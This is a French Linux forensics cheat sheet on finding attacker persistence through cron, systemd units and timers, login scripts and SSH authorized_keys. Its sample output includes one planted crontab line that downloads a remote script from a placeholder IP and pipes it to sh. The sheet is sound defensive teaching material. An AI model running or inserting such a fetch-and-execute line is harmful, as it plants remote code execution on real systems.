---
title: "Persistance"
cours:
  - library/cyber/forensic/investigation-numerique-forensic/index.md
  - library/cyber/detection/reponse-a-incident/index.md
---
# Persistance

Ce qui relancera l'attaquant au prochain démarrage ou à la prochaine connexion.

Les incontournables : `crontab -l` · `/etc/cron.*` · `systemctl list-unit-files --state=enabled` · `systemctl list-timers` · `authorized_keys`
{ .kw-cs-top }

## Tâches, services et scripts de démarrage

### Chercher une persistance

```bash title="Commande"
sudo ls -la /etc/cron.* /var/spool/cron/crontabs 2>/dev/null   # tâches cron du système et des utilisateurs
systemctl list-unit-files --state=enabled                      # services lancés au démarrage
ls -la /etc/profile.d ~/.bashrc ~/.profile ~/.ssh/authorized_keys   # scripts de connexion, clés SSH autorisées
```

```bash title="Exemple"
sudo grep -R . /etc/cron* /var/spool/cron 2>/dev/null | tee persistance-cron.txt
```

??? example "Sortie"
    ```text
    /etc/cron.d/certbot:0 */12 * * * root test -x /usr/bin/certbot && certbot -q renew
    /var/spool/cron/crontabs/www-data:*/10 * * * * curl -s http://203.0.113.7/u.sh | sh
    ```

```bash title="Exemple 2"
sudo find /etc/systemd/system /lib/systemd/system -name "*.service" -newermt "2026-09-25" -ls
# unités de service créées ou modifiées depuis une date
```

Pour comprendre : [Linux — prises de notes, investigation](../../../../library/it/linux/linux-prises-de-notes/02-investigation-forensics.md)
{ .kw-cs-meta }

![[cheatsheets/linux/administration/taches#Lister les timers systemd]]

Étape suivante : [Traces d'activité](traces.md)
{ .kw-cs-meta }

## Vue d'ensemble

| Mécanisme | Où regarder | Commande |
|---|---|---|
| Cron | `/etc/crontab`, `/etc/cron.*`, `/var/spool/cron/crontabs` | `ls -la /etc/cron.*` · `crontab -l -u <utilisateur>` |
| Timers systemd | Unités `.timer` | `systemctl list-timers --all` |
| Services | `/etc/systemd/system/` | `systemctl list-unit-files --state=enabled` |
| Scripts de connexion | `/etc/profile.d/`, `~/.bashrc`, `~/.profile` | `ls -la` + lecture |
| Clés SSH autorisées | `~/.ssh/authorized_keys` | Clé inconnue = accès permanent |
